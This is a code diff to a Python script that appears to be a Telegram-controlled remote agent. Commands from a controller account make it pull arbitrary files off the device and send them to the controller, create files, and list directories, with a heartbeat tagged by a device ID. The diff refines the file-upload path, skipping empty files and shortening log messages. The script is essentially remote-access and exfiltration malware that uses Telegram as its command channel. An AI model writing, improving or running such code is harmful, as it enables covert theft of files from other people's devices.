@@ -1,3 +1,4 @@
+
 import asyncio
 import os
 import subprocess
@@ -85,13 +86,18 @@ async def heartbeat():
 
 async def safe_send_file(target, path):
     try:
+        # Check for 0-byte files to prevent Telegram API error
+        if os.path.getsize(path) == 0:
+            await client.send_message(target, f'[{DEVICE_ID}] SKIPPED (0 bytes): {os.path.basename(path)}')
+            return
+            
         await client.send_file(target, path)
         await asyncio.sleep(2) # Delay to prevent flood
     except FloodWaitError as e:
         await client.send_message(target, f'[{DEVICE_ID}] FloodWait: Sleeping for {e.seconds}s')
         await asyncio.sleep(e.seconds)
     except Exception as e:
-        await client.send_message(target, f'[{DEVICE_ID}] ERROR sending {path}: {e}')
+        await client.send_message(target, f'[{DEVICE_ID}] ERROR sending {os.path.basename(path)}: {e}')
 
 @client.on(events.NewMessage)
 async def handler(event):
@@ -118,7 +124,7 @@ async def handler(event):
         elif cmd_text.startswith('PULL '):
             path = cmd_text[5:].strip()
             if os.path.isfile(path):
-                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pulling file: {path}')
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] Pulling file: {os.path.basename(path)}')
                 await safe_send_file(CONTROLLER_ENTITY, path)
             else:
                 await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: File {path} not found')
@@ -178,7 +184,6 @@ async def handler(event):
                 await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Directory not found')
 
         elif cmd_text.startswith('CREATE '):
-            # Format: CREATE /path/to/file|content here
             payload = cmd_text[7:].strip()
             if '|' in payload:
                 path, content = payload.split('|', 1)
